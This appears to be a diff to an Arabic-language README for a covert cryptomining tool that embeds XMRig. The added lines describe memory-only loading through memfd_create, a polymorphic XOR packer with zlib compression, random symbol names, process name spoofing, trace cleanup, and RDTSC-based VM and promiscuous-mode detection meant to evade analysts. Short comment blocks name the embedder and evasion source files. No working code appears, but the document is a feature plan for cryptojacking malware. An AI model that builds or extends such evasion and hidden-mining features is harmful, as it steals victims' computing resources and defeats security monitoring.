@@ -50,10 +50,14 @@ cd output
 - ✅ تنظيف الآثار التلقائي
 
 ### **نظام التضمين:**
-- ✅ XMRig مدمج في الكود (لا ملفات خارجية)
+- ✅ XMRig مدمج في الذاكرة (memfd)
 - ✅ Config.json مدمج
 - ✅ أسماء ملفات عشوائية
 - ✅ تنظيف تلقائي للملفات المؤقتة
+-   ✓ Polymorphic packer: تشفير XOR ديناميكي للبلايناري
+-   ✓ ضغط Binary باستخدام zlib لتقليل الآثار والسلاسل الثابتة
+-   ✓ فك التشفير وفك الضغط في الذاكرة دون لمس القرص
+-   ✓ أسماء رمزية عشوائية للمتغيرات والرموز المدمجة
 
 ### **تقنيات المقاومة:**
 - ✅ Anti-debugging (ptrace detection)
@@ -61,8 +65,26 @@ cd output
 - ✅ Process name spoofing
 - ✅ Low priority execution
 - ✅ Adaptive behavior
+-   ✓ Memory-only loading via memfd_create (no disk writes)
+-   ✓ RDTSC-based VM timing detection
+-   ✓ Promiscuous mode detection across all network interfaces
+
+## ⚙️ تحسين نظام التضمين
+```cpp
+// في binary_embedder.cpp:
+// - embedded_xmrig_encrypted[]: مصفوفة البايناري المشفرة بـ XOR
+// - xor_key[]: مفتاح عشوائي يُولد عند build
+// - استخدم zlib لفك الضغط بعد XOR في الذاكرة (memfd)
+```
 
 ## ⚙️ تخصيص الإعدادات
+
+### تعديل آليات VM والواجهة الشبكية:
+```cpp
+// في evasion_monitor.cpp:
+// - checkVMIndicators(): تمت إضافة فحص RDTSC للكشف عن VM
+// - isNetworkMonitored(): تمت تهيئة فحص promiscuous mode لأجل جميع الواجهات
+```
 
 ### تعديل إعدادات XMRig:
 ```bash
